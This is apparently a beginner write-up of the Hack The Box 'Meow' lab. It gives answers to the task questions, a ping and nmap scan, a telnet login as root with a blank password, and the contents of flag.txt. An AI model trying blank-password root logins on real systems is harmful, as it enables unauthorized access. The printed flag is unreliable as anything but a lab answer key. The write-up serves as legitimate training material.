## Tasks

###### Task 1

What does the acronym VM stand for? 
[Virtual machine](https://en.wikipedia.org/wiki/Virtual_machine)

###### Task 2

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell. 

[terminal](https://en.wikipedia.org/wiki/Terminal_emulator)

###### Task 3

What service do we use to form our VPN connection into HTB labs? 
[openvpn](https://en.wikipedia.org/wiki/OpenVPN)

###### Task 4

What tool do we use to test our connection to the target with an ICMP echo request? 
[ping](https://en.wikipedia.org/wiki/Ping_(networking_utility))
###### Task 5

What is the name of the most common tool for finding open ports on a target? 
[nmap](https://en.wikipedia.org/wiki/Nmap)

###### Task 6

What service do we identify on port 23/tcp during our scans? 
[telnet](https://en.wikipedia.org/wiki/Telnet)

###### Task 7

What username is able to log into the target over telnet with a blank password? 
[root](https://en.wikipedia.org/wiki/Superuser)


root flag

ping machine
```
[cry_baby@ace ~]$ ping 10.129.190.255
PING 10.129.190.255 (10.129.190.255) 56(84) bytes of data.
64 bytes from 10.129.190.255: icmp_seq=1 ttl=63 time=10.2 ms
64 bytes from 10.129.190.255: icmp_seq=2 ttl=63 time=10.5 ms
64 bytes from 10.129.190.255: icmp_seq=3 ttl=63 time=10.2 ms
64 bytes from 10.129.190.255: icmp_seq=4 ttl=63 time=10.3 ms
^C
--- 10.129.190.255 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 10.216/10.303/10.452/0.093 ms
```
```
[cry_baby@ace ~]$ nmap -sV 10.129.190.255
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-14 21:50 EDT
Nmap scan report for 10.129.190.255
Host is up (0.010s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
[cry_baby@ace ~]$ telnet 10.129.190.255
Trying 10.129.190.255...
Connected to 10.129.190.255.
Escape character is '^]'.


  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█



Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 15 Aug 2024 03:19:20 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.190.255
  IPv6 address for eth0: dead:beef::250:56ff:feb0:9afd

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 





```

















































































